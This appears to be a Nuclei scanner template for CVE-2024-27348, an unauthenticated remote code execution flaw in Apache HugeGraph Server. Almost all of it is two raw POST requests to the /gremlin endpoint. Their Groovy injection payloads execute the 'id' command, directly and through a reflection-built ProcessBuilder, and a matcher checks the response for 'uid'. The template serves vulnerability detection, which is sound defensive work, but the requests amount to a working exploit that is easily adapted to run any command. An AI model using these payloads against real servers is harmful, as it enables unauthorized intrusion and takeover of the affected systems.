id: CVE-2024-27348

info:
  name: Unauthenticated RCE via Groovy Injection in Apache HugeGraph Server
  author: Stux
  severity: critical
  description: Allows unauthenticated users to execute OS commands via Groovy injection.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27348
    - http://www.openwall.com/lists/oss-security/2024/04/22/3
    - https://hugegraph.apache.org/docs/config/config-authentication/#configure-user-authentication
    - https://lists.apache.org/thread/nx6g6htyhpgtzsocybm242781o8w5kq9
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    epss-score: 0.00045
    epss-percentile: 0.15047
  tags: rce,cve,cve2024,groovy,hugegraph

requests:
  - raw:
      - |
        POST /gremlin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
        "gremlin": "def result = \"id\".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField(result);"
        }

      - |
        POST /gremlin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
        "gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"id\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {}
        }     
                
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid"
        part: body